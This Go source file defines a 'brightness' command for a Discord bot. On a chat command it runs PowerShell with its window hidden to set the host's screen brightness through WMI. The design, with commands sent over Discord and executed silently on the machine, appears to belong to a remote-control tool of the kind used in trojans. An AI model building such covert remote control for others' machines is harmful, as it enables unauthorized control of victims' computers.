package commands

import (
	"fmt"
	"os/exec"
	"strconv"
	"syscall"

	"Hypothermia/src/misc"
	"github.com/bwmarrin/discordgo"
)

const (
	lightUsage string = "[level]"

	lightArgsError  string = "🟥 Expected 1 argument."
	lightRunError   string = "🟥 Failed to change brightness."
	lightConvError  string = "🟥 Failed to convert argument."
	lightLevelError string = "🟥 Number needs to be between 0 and 100."

	lightSuccess string = "🟩 Set brightness to %d%%."
)

func (*LightCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, lightArgsError, lightUsage), m.Reference())
		return
	}

	level, err := strconv.Atoi(args[0])
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, lightConvError, m.Reference())
		return
	}

	if level < 0 || level > 100 {
		s.ChannelMessageSendReply(m.ChannelID, lightLevelError, m.Reference())
		return
	}

	cmdArg := fmt.Sprintf("(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, %d)", level)
	cmd := exec.Command("powershell", "-Command", cmdArg)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	err = cmd.Run()
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, lightRunError, m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(lightSuccess, level), m.Reference())
}

func (*LightCommand) Name() string {
	return "brightness"
}

func (*LightCommand) Info() string {
	return "changes the screen brightness level"
}

type LightCommand struct{}
